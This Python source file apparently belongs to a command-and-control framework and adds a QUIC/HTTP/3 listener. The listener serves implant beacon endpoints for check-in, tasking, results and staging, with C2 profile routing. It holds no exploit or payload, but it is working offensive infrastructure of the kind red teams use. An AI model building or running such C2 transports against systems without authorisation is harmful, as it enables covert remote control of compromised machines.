"""QUIC / HTTP/3 listener.

Serves the same three beacon endpoints as the HTTP listener, over
QUIC instead of TCP. Subclasses `BeaconListener` so the request
handlers (`_checkin`, `_tasks`, `_results`, `_stage`), the wire
envelope helpers (`_unwrap`, `_wrap`), the session-cookie logic,
and the C2 profile route auto-discovery are all reused verbatim.

Requests arrive as HTTP/3 streams. Each is dispatched into the
same Flask app the HTTP listener uses, through a synthetic
request context, so `flask.request` behaves identically and every
handler works without modification. The response that Flask
produces is written back to the HTTP/3 stream as-is.

Requires aioquic. Install with `pip install aioquic`.
"""

from __future__ import annotations

import asyncio
import logging
import ssl
import threading
from typing import Optional

log = logging.getLogger(__name__)

try:
    from aioquic.asyncio import serve as _aquic_serve
    from aioquic.asyncio.protocol import QuicConnectionProtocol
    from aioquic.h3.connection import H3_ALPN, H3Connection
    from aioquic.h3.events import (
        HeadersReceived, DataReceived,
    )
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.quic.events import QuicEvent
    _AIOQUIC = True
except ImportError:
    _AIOQUIC = False

from .base import Transport


class _H3ServerProtocol(QuicConnectionProtocol):
    """One QUIC connection, carrying one or more HTTP/3 streams.

    Each complete request is handed to `listener.dispatch_http3`,
    which drives the Flask app and returns the response tuple. The
    protocol writes the response back onto the same stream and
    closes it.
    """

    def __init__(self, *args, listener=None, **kwargs):
        super().__init__(*args, **kwargs)
        self._listener = listener
        self._http: Optional[H3Connection] = None
        self._buffers: dict = {}

    def quic_event_received(self, event: QuicEvent) -> None:
        if self._http is None:
            self._http = H3Connection(self._quic)
        for http_event in self._http.handle_event(event):
            self._handle_http_event(http_event)

    def _peer_ip(self) -> str:
        try:
            peer = self._transport.get_extra_info('peername')
            if peer:
                return peer[0]
        except Exception:
            pass
        return '0.0.0.0'

    _MAX_BODY_BYTES = 16 * 1024 * 1024

    def _handle_http_event(self, event) -> None:
        if isinstance(event, HeadersReceived):
            self._buffers[event.stream_id] = {
                'headers': event.headers,
                'body':    b'',
            }
            if event.stream_ended:
                self._dispatch(event.stream_id)
        elif isinstance(event, DataReceived):
            buf = self._buffers.get(event.stream_id)
            if buf is None:
                return
            buf['body'] += event.data
            if len(buf['body']) > self._MAX_BODY_BYTES:
                log.warning(
                    "quic: stream %d body exceeds %d bytes; "
                    "closing the connection",
                    event.stream_id, self._MAX_BODY_BYTES)
                self._buffers.pop(event.stream_id, None)
                try:
                    self._quic.close(
                        error_code=0x0,
                        reason_phrase=b'body too large')
                except Exception:
                    pass
                return
            if event.stream_ended:
                self._dispatch(event.stream_id)

    def _dispatch(self, stream_id: int) -> None:
        buf = self._buffers.pop(stream_id, None)
        if buf is None:
            return

        method = path = ''
        header_pairs = []
        for raw_name, raw_val in buf['headers']:
            name = (raw_name.decode('latin-1')
                    if isinstance(raw_name, bytes) else raw_name)
            val = (raw_val.decode('latin-1')
                   if isinstance(raw_val, bytes) else raw_val)
            lname = name.lower()
            if lname == ':method':
                method = val
            elif lname == ':path':
                path = val
            elif lname.startswith(':'):
                continue
            else:
                header_pairs.append((name, val))

        try:
            status, resp_headers, body = \
                self._listener.dispatch_http3(
                    method=method,
                    path=path,
                    headers=header_pairs,
                    body=buf['body'],
                    peer_ip=self._peer_ip(),
                )
        except Exception as exc:
            log.warning("quic: dispatch failed: %s", exc)
            status, resp_headers, body = 500, {}, b'internal error'

        try:
            h3_headers = [(b':status', str(status).encode('ascii'))]
            for k, v in resp_headers.items():
                kl = k.lower()
                if kl in ('content-length', 'transfer-encoding',
                          'connection', 'keep-alive'):
                    continue
                h3_headers.append(
                    (kl.encode('latin-1'),
                     str(v).encode('latin-1')))
            self._http.send_headers(
                stream_id=stream_id, headers=h3_headers)
            self._http.send_data(
                stream_id=stream_id, data=body, end_stream=True)
            self.transmit()
        except Exception as exc:
            log.warning("quic: response write failed: %s", exc)


from ..listener import BeaconListener


class QUICListener(BeaconListener):

    name = 'quic'

    def __init__(self, engine, host: str, port: int,
                 certfile: str, keyfile: str,
                 client_ca: str = None,
                 extra_paths: dict = None,
                 c2_profile_dir: str = None,
                 profile_filter: str = None,
                 **kwargs):

        super().__init__(
            engine, host, port, certfile, keyfile,
            client_ca=client_ca,
            extra_paths=extra_paths,
            c2_profile_dir=c2_profile_dir,
            profile_filter=profile_filter)

        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._thread: Optional[threading.Thread] = None
        self._server = None
        self._stop_event = threading.Event()

    # ------------------------------------------------------------------
    # HTTP/3 dispatch into the Flask app

    def dispatch_http3(self, method: str, path: str,
                       headers, body: bytes,
                       peer_ip: str):
        """Run one HTTP/3 request through the Flask app.

        Uses `test_request_context` so `flask.request` behaves
        exactly as it does under the HTTP listener. The Flask
        response object is unpacked into a plain tuple the caller
        can write back to the QUIC stream.
        """
        header_dict = {}
        for k, v in headers:
            header_dict[k] = v

        with self._app.test_request_context(
                path=path,
                method=method,
                headers=header_dict,
                data=body,
                base_url='https://quic.local',
                environ_base={'REMOTE_ADDR': peer_ip}):
            resp = self._app.full_dispatch_request()

        return (
            resp.status_code,
            dict(resp.headers),
            resp.get_data(),
        )

    # ------------------------------------------------------------------
    # Lifecycle

    def start(self) -> bool:
        if not _AIOQUIC:
            log.error("quic: aioquic not installed "
                      "(pip install aioquic)")
            return False

        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._run, daemon=True)
        self._running = True
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._stop_event.set()
        if self._loop is not None:
            try:
                self._loop.call_soon_threadsafe(
                    self._loop.stop)
            except Exception:
                pass
        if self._thread is not None:
            self._thread.join(timeout=5.0)
            self._thread = None

    def _run(self) -> None:
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        try:
            self._loop.run_until_complete(self._serve())
        except Exception as exc:
            log.error("quic: server died: %s", exc)
        finally:
            try:
                self._loop.close()
            except Exception:
                pass
            self._loop = None

    async def _serve(self) -> None:
        cfg = QuicConfiguration(
            is_client=False,
            alpn_protocols=H3_ALPN,
        )
        try:
            cfg.load_cert_chain(self.certfile, self.keyfile)
        except Exception as exc:
            log.error("quic: load_cert_chain: %s", exc)
            return

        if self.client_ca:
            cfg.verify_mode = ssl.CERT_REQUIRED
            try:
                cfg.load_verify_locations(self.client_ca)
            except Exception as exc:
                log.error("quic: client CA: %s", exc)
                return

        listener = self

        def _factory(*args, **kwargs):
            return _H3ServerProtocol(
                *args, listener=listener, **kwargs)

        try:
            self._server = await _aquic_serve(
                self.host, self.port,
                configuration=cfg,
                create_protocol=_factory,
            )
        except Exception as exc:
            log.error("quic: bind %s:%d: %s",
                      self.host, self.port, exc)
            return

        log.info("quic: listening on %s:%d", self.host, self.port)

        try:
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            pass
        finally:
            if self._server is not None:
                try:
                    self._server.close()
                except Exception:
                    pass
                self._server = None